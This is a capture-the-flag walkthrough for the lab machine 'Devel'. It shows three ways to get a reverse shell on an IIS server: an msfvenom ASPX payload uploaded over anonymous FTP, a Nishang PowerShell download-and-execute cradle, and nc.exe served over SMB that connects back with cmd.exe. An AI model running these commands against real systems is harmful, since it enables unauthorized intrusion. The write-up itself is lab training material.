# Devel - IIS webshell upload / Watson PE

**Webpage of Devel**

[image]

**We can log in FTP using anonymous.**

[image]

3 ways to get a shell:

## 1. Shell.aspx shell

Create shell.aspx and upload via FTP to web:

```bash
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=3333 -e x86/shikata_ga_nai -o shell.aspx
```

If uploaded, run:

```bash
curl http://10.10.10.5/shell.aspx
```

[image]

## 2. Nishang

There is a cmd webshell.

[image]

### Attacker side

1. **First download nishang framework**

```bash
git clone https://github.com/samratashok/nishang.git
```

2. **Change IP / Port**

```bash
nano /nishang/Shells/InvokePowerShellTcp.ps1
```

[image]

This will create a webclient object, and use the download string method to get the text returned from the given URL. That text is passed into `iex`, which runs it.

```bash
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.28/Invoke-PowerShellTcp.ps1')
```

[image]

### Reverse connection

```bash
nc -lvp 5555
```

[image]

## 3. nc.exe

1. **Prepare env**

```bash
mkdir smb
cd smb
cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe smb/
```

2. **Running SMB server**

```bash
impacket-smbserver share smb
```

[image]

```
\\10.10.16.4\share\nc.exe -e cmd.exe 10.10.16.4 9001
```

[image]

## Reverse Connections

[image]

## Check Microsoft .NET Framework version

```bash
dir C:\Windows\Microsoft.NET\Framework
```

[image]
